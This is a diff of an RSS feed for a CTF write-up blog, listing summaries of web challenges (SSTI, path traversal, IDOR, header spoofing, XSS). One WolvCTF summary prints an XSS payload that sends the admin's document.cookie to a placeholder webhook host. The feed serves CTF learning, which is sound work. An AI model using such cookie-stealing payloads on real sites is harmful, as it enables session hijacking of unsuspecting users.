@@ -6,110 +6,77 @@
     <description>Recent content in Web on chrootcommit</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 11 Sep 2023 16:54:19 -0400</lastBuildDate><atom:link href="https://chrootcommit.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 28 Apr 2024 14:31:07 -0400</lastBuildDate>
+    <atom:link href="https://chrootcommit.github.io/tags/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[MidnightCTF2024 - Web] Cachecache</title>
+      <link>https://chrootcommit.github.io/posts/midnightctf2024-web-cachecache/</link>
+      <pubDate>Sun, 28 Apr 2024 14:31:07 -0400</pubDate>
+      <guid>https://chrootcommit.github.io/posts/midnightctf2024-web-cachecache/</guid>
+      <description>Team : The Penetrators&#xA;Overview On a une application web flask d&amp;rsquo;affichage de notes avec la possibilité de faire consulter les notes par un bot selenium. L&amp;rsquo;objectif est de voler le cookie du bot.&#xA;Code from flask import Flask, request from flask_caching import Cache import random import string from selenium import webdriver from selenium.webdriver.chrome.options import Options from selenium.webdriver.chrome.service import Service from os import environ from time import sleep app = Flask(__name__) config = { &amp;#34;DEBUG&amp;#34;: False, &amp;#34;CACHE_TYPE&amp;#34;: &amp;#34;SimpleCache&amp;#34;, &amp;#34;CACHE_DEFAULT_TIMEOUT&amp;#34;: 300 } app.</description>
+    </item>
     <item>
       <title>[PatriotCTF2023 - Web] Pick Your Starter</title>
       <link>https://chrootcommit.github.io/posts/patriotctf2023_pick-your-starter/</link>
       <pubDate>Mon, 11 Sep 2023 16:54:19 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/patriotctf2023_pick-your-starter/</guid>
-      <description>Team: XxxPassword123xxX
-Difficulty: medium
-Overview Lorsque l&amp;rsquo;on entre un endpoint qui n&amp;rsquo;existe pas l&amp;rsquo;erreur 404 se déclenche et affiche notre endpoint.
-Exploitation de SSTI On tente l&amp;rsquo;injection du calcul 7*7 pour s&amp;rsquo;assurer que l&amp;rsquo;on se trouve sur une SSTI :
-BlackList Après plusieurs tests, on constate que l&amp;rsquo;application web blacklist un ensemble de termes et de caractères en renvoyant &amp;ldquo;that&amp;rsquo;s not a starter&amp;rdquo;. Voici une liste de caractères filtrés :</description>
+      <description>Team: XxxPassword123xxX&#xA;Difficulty: medium&#xA;Overview Lorsque l&amp;rsquo;on entre un endpoint qui n&amp;rsquo;existe pas l&amp;rsquo;erreur 404 se déclenche et affiche notre endpoint.&#xA;Exploitation de SSTI On tente l&amp;rsquo;injection du calcul 7*7 pour s&amp;rsquo;assurer que l&amp;rsquo;on se trouve sur une SSTI :&#xA;BlackList Après plusieurs tests, on constate que l&amp;rsquo;application web blacklist un ensemble de termes et de caractères en renvoyant &amp;ldquo;that&amp;rsquo;s not a starter&amp;rdquo;. Voici une liste de caractères filtrés :</description>
     </item>
-    
     <item>
       <title>[PatriotCTF2023 - Web] flower Shop</title>
       <link>https://chrootcommit.github.io/posts/patriotctf2023_flower-shop/</link>
       <pubDate>Mon, 11 Sep 2023 15:15:15 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/patriotctf2023_flower-shop/</guid>
-      <description>Team: XxxPassword123xxX
-Difficulty: medium
-Overview On a une application web dont on a accès au code source. Cette WebApp permet d&amp;rsquo;inscrire/s&amp;rsquo;authenfier et de réinitialiser son mot de passe. A l&amp;rsquo;inscription on fournit le webhook permettant de recevoir son nouveau mot de passe en cas de réinitialisation de ce dernier. Notre objectif est de pouvoir lire le fichier admin.php et récupérer le flag à l&amp;rsquo;intérieur.
-Analyse de code Filtre de l&amp;rsquo;input de webhook En analysant le code, on peut apercevoir un filtre sur la validation du format du webhook :</description>
+      <description>Team: XxxPassword123xxX&#xA;Difficulty: medium&#xA;Overview On a une application web dont on a accès au code source. Cette WebApp permet d&amp;rsquo;inscrire/s&amp;rsquo;authenfier et de réinitialiser son mot de passe. A l&amp;rsquo;inscription on fournit le webhook permettant de recevoir son nouveau mot de passe en cas de réinitialisation de ce dernier. Notre objectif est de pouvoir lire le fichier admin.php et récupérer le flag à l&amp;rsquo;intérieur.&#xA;Analyse de code Filtre de l&amp;rsquo;input de webhook En analysant le code, on peut apercevoir un filtre sur la validation du format du webhook :</description>
     </item>
-    
     <item>
       <title>[DUCTF2023 - Web] Actually_Proxed</title>
       <link>https://chrootcommit.github.io/posts/ductf2023-web-actually_proxed/</link>
       <pubDate>Mon, 04 Sep 2023 13:47:48 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/ductf2023-web-actually_proxed/</guid>
-      <description>Team: XxxPassword123xxX
-Difficulty: easy
-Code analysis Secret server&amp;rsquo;s code :
-package main import ( &amp;#34;flag&amp;#34; &amp;#34;fmt&amp;#34; &amp;#34;log&amp;#34; &amp;#34;net/http&amp;#34; &amp;#34;os&amp;#34; &amp;#34;strings&amp;#34; ) var ( port = flag.Int(&amp;#34;port&amp;#34;, 8081, &amp;#34;port to listen on&amp;#34;) ) func main() { flag.Parse() http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { xff := r.Header.Values(&amp;#34;X-Forwarded-For&amp;#34;) ip := strings.Split(r.RemoteAddr, &amp;#34;:&amp;#34;)[0] if xff != nil { ips := strings.Split(xff[len(xff)-1], &amp;#34;, &amp;#34;) ip = ips[len(ips)-1] ip = strings.TrimSpace(ip) } // 1337 hax0rz 0nly! if ip !</description>
+      <description>Team: XxxPassword123xxX&#xA;Difficulty: easy&#xA;Code analysis Secret server&amp;rsquo;s code :&#xA;package main import ( &amp;#34;flag&amp;#34; &amp;#34;fmt&amp;#34; &amp;#34;log&amp;#34; &amp;#34;net/http&amp;#34; &amp;#34;os&amp;#34; &amp;#34;strings&amp;#34; ) var ( port = flag.Int(&amp;#34;port&amp;#34;, 8081, &amp;#34;port to listen on&amp;#34;) ) func main() { flag.Parse() http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { xff := r.Header.Values(&amp;#34;X-Forwarded-For&amp;#34;) ip := strings.Split(r.RemoteAddr, &amp;#34;:&amp;#34;)[0] if xff != nil { ips := strings.Split(xff[len(xff)-1], &amp;#34;, &amp;#34;) ip = ips[len(ips)-1] ip = strings.TrimSpace(ip) } // 1337 hax0rz 0nly! if ip !</description>
     </item>
-    
     <item>
       <title>[DUCTF2023 - Web] Static_File_Server</title>
       <link>https://chrootcommit.github.io/posts/ductf2023-web-static_file_server/</link>
       <pubDate>Mon, 04 Sep 2023 13:30:58 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/ductf2023-web-static_file_server/</guid>
-      <description>Team: XxxPassword123xxX
-Difficulty: easy
-Code analysis from aiohttp import web async def index(request): return web.Response(body=&amp;#39;&amp;#39;&amp;#39; &amp;lt;header&amp;gt;&amp;lt;h1&amp;gt;static file server&amp;lt;/h1&amp;gt;&amp;lt;/header&amp;gt; Here are some files: &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;&amp;lt;img src=&amp;#34;/files/ductf.png&amp;#34;&amp;gt;&amp;lt;/img&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;/files/not_the_flag.txt&amp;#34;&amp;gt;not the flag&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;#39;&amp;#39;&amp;#39;, content_type=&amp;#39;text/html&amp;#39;, status=200) app = web.Application() app.add_routes([ web.get(&amp;#39;/&amp;#39;, index), # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690 web.static(&amp;#39;/files&amp;#39;, &amp;#39;./files&amp;#39;, follow_symlinks=True) ]) web.run_app(app) According to the code, the route /files gives access to static files. It maybe vulnerable to path traversal, let&amp;rsquo;s exploit it throught BurpSuite :</description>
+      <description>Team: XxxPassword123xxX&#xA;Difficulty: easy&#xA;Code analysis from aiohttp import web async def index(request): return web.Response(body=&amp;#39;&amp;#39;&amp;#39; &amp;lt;header&amp;gt;&amp;lt;h1&amp;gt;static file server&amp;lt;/h1&amp;gt;&amp;lt;/header&amp;gt; Here are some files: &amp;lt;ul&amp;gt; &amp;lt;li&amp;gt;&amp;lt;img src=&amp;#34;/files/ductf.png&amp;#34;&amp;gt;&amp;lt;/img&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;li&amp;gt;&amp;lt;a href=&amp;#34;/files/not_the_flag.txt&amp;#34;&amp;gt;not the flag&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;#39;&amp;#39;&amp;#39;, content_type=&amp;#39;text/html&amp;#39;, status=200) app = web.Application() app.add_routes([ web.get(&amp;#39;/&amp;#39;, index), # this is handled by https://github.com/aio-libs/aiohttp/blob/v3.8.5/aiohttp/web_urldispatcher.py#L654-L690 web.static(&amp;#39;/files&amp;#39;, &amp;#39;./files&amp;#39;, follow_symlinks=True) ]) web.run_app(app) According to the code, the route /files gives access to static files. It maybe vulnerable to path traversal, let&amp;rsquo;s exploit it throught BurpSuite :</description>
     </item>
-    
     <item>
       <title>[DUCTF2023 - Web] Proxed</title>
       <link>https://chrootcommit.github.io/posts/ductf2023-web-proxed/</link>
       <pubDate>Mon, 04 Sep 2023 13:00:02 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/ductf2023-web-proxed/</guid>
-      <description>Team: XxxPassword123xxX
-Difficulty: easy
-Code analysis package main import ( &amp;#34;flag&amp;#34; &amp;#34;fmt&amp;#34; &amp;#34;log&amp;#34; &amp;#34;net/http&amp;#34; &amp;#34;os&amp;#34; &amp;#34;strings&amp;#34; ) var ( port = flag.Int(&amp;#34;port&amp;#34;, 8081, &amp;#34;The port to listen on&amp;#34;) ) func main() { flag.Parse() http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { xff := r.Header.Values(&amp;#34;X-Forwarded-For&amp;#34;) ip := strings.Split(r.RemoteAddr, &amp;#34;:&amp;#34;)[0] if xff != nil { ips := strings.Split(xff[len(xff)-1], &amp;#34;, &amp;#34;) ip = ips[len(ips)-1] ip = strings.TrimSpace(ip) } if ip != &amp;#34;31.33.33.7&amp;#34; { message := fmt.</description>
+      <description>Team: XxxPassword123xxX&#xA;Difficulty: easy&#xA;Code analysis package main import ( &amp;#34;flag&amp;#34; &amp;#34;fmt&amp;#34; &amp;#34;log&amp;#34; &amp;#34;net/http&amp;#34; &amp;#34;os&amp;#34; &amp;#34;strings&amp;#34; ) var ( port = flag.Int(&amp;#34;port&amp;#34;, 8081, &amp;#34;The port to listen on&amp;#34;) ) func main() { flag.Parse() http.HandleFunc(&amp;#34;/&amp;#34;, func(w http.ResponseWriter, r *http.Request) { xff := r.Header.Values(&amp;#34;X-Forwarded-For&amp;#34;) ip := strings.Split(r.RemoteAddr, &amp;#34;:&amp;#34;)[0] if xff != nil { ips := strings.Split(xff[len(xff)-1], &amp;#34;, &amp;#34;) ip = ips[len(ips)-1] ip = strings.TrimSpace(ip) } if ip != &amp;#34;31.33.33.7&amp;#34; { message := fmt.</description>
     </item>
-    
     <item>
       <title>[HeroCTFv5 - Web] Blogodogo1</title>
       <link>https://chrootcommit.github.io/posts/heroctfv5-blogodogo1/</link>
       <pubDate>Sun, 14 May 2023 19:31:35 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/heroctfv5-blogodogo1/</guid>
-      <description>under B0rn2PwnCTF team
-Overview Try to see the content of the secret note of the administator user.
-(We have the website&amp;rsquo;s source code)
-Idor exploitation We can try to enumerate all author&amp;rsquo;s id to find the admin&amp;rsquo;s posts. Here, we used burp intruder with sniper as attack type and payload of numbers :
-Generate time based hash of a post It sounds good, we found the admin&amp;rsquo;s Secret blog post, but this last was indicated as draft and we could not access to the draft post of another user.</description>
+      <description>under B0rn2PwnCTF team&#xA;Overview Try to see the content of the secret note of the administator user.&#xA;(We have the website&amp;rsquo;s source code)&#xA;Idor exploitation We can try to enumerate all author&amp;rsquo;s id to find the admin&amp;rsquo;s posts. Here, we used burp intruder with sniper as attack type and payload of numbers :&#xA;Generate time based hash of a post It sounds good, we found the admin&amp;rsquo;s Secret blog post, but this last was indicated as draft and we could not access to the draft post of another user.</description>
     </item>
-    
     <item>
       <title>[HeroCTFv5 - Web] DrinkFromMyFlask1</title>
       <link>https://chrootcommit.github.io/posts/heroctfv5-drinkfrommyflask1/</link>
       <pubDate>Sun, 14 May 2023 18:49:09 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/heroctfv5-drinkfrommyflask1/</guid>
-      <description>under B0rn2PwnCTF team
-Overview A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process&amp;hellip; Can you put your hacker skills to good use and help him out?
-You should probably be able to access the server hosting your target&amp;rsquo;s last project, shouldn&amp;rsquo;t you ? I heard is making a lost of programming mistakes&amp;hellip;</description>
+      <description>under B0rn2PwnCTF team&#xA;Overview A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process&amp;hellip; Can you put your hacker skills to good use and help him out?&#xA;You should probably be able to access the server hosting your target&amp;rsquo;s last project, shouldn&amp;rsquo;t you ? I heard is making a lost of programming mistakes&amp;hellip;</description>
     </item>
-    
     <item>
       <title>[HeroCTFv5 - Web] Best Schools</title>
       <link>https://chrootcommit.github.io/posts/heroctfv5-best-school/</link>
       <pubDate>Sun, 14 May 2023 18:06:23 -0400</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/heroctfv5-best-school/</guid>
-      <description>under B0rn2PwnCTF team
-Overview An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the &amp;lsquo;Flag CyberSecurity School&amp;rsquo; in first place and you&amp;rsquo;ll get your reward!
-Detect vulnerable source code function updateNbClick(schoolName) { var updated_school = []; fetch(&amp;#34;/graphql&amp;#34;, { method: &amp;#34;POST&amp;#34;, headers:{ &amp;#34;Content-Type&amp;#34;: &amp;#34;application/json&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;application/json&amp;#34; }, body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: &amp;#34;${schoolName}&amp;#34;){schoolId, nbClick} }`}) }).</description>
+      <description>under B0rn2PwnCTF team&#xA;Overview An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the &amp;lsquo;Flag CyberSecurity School&amp;rsquo; in first place and you&amp;rsquo;ll get your reward!&#xA;Detect vulnerable source code function updateNbClick(schoolName) { var updated_school = []; fetch(&amp;#34;/graphql&amp;#34;, { method: &amp;#34;POST&amp;#34;, headers:{ &amp;#34;Content-Type&amp;#34;: &amp;#34;application/json&amp;#34;, &amp;#34;Accept&amp;#34;: &amp;#34;application/json&amp;#34; }, body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: &amp;#34;${schoolName}&amp;#34;){schoolId, nbClick} }`}) }).</description>
     </item>
-    
     <item>
       <title>WolvCTF 2023 - Writeup</title>
       <link>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</link>
       <pubDate>Mon, 20 Mar 2023 00:00:00 +0000</pubDate>
-      
       <guid>https://chrootcommit.github.io/posts/2023-03-20-wolvctf2023/</guid>
-      <description>Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&amp;rsquo;s admin. (admin is a bot who visits the url you give).
-Payload : &amp;lt;script&amp;gt;window.location=&amp;#34;https://&amp;lt;myWebHook&amp;gt;/?c=&amp;#34;.concat(document.cookie)&amp;lt;/script&amp;gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&amp;rsquo;t gather the cookie throught the document object.</description>
+      <description>Challenges Solved : Web ZOmbie 101 This Challenge is a a classic xss where you steal the cookie&amp;rsquo;s admin. (admin is a bot who visits the url you give).&#xA;Payload : &amp;lt;script&amp;gt;window.location=&amp;#34;https://&amp;lt;myWebHook&amp;gt;/?c=&amp;#34;.concat(document.cookie)&amp;lt;/script&amp;gt; I sent the url with payload to the admin input and got the flag : wctf{c14551c-4dm1n-807-ch41-n1c3-j08-93261} Zombie 201 It is the same webapp than Zombie 101, but admin activated the httponly parameter. We can&amp;rsquo;t gather the cookie throught the document object.</description>
     </item>
-    
   </channel>
 </rss>
